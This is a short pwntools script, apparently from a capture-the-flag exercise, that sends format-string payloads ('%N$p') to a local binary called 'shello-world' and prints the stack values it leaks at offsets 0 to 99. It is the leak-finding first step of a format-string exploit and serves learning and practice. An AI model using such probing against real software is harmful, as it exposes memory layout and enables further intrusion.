from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF("shello-world", checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        io = process(elf.path, level='error')
        # Print the pointer at offset i
        io.sendline(b'A'*8 + '%{}$p'.format(i).encode())
        # Receive the response with a large buffer size
        result = io.recv(4096)
        # Find the position of 'Hello, ' in the response
        hello_pos = result.find(b'Hello, ')
        if hello_pos != -1:
            # Extract the formatted value from the response
            formatted_value = result[hello_pos + len(b'Hello, '):].strip()
            print(f"{i}: {formatted_value}")
        # Exit the process
        io.close()
    except EOFError:
        pass
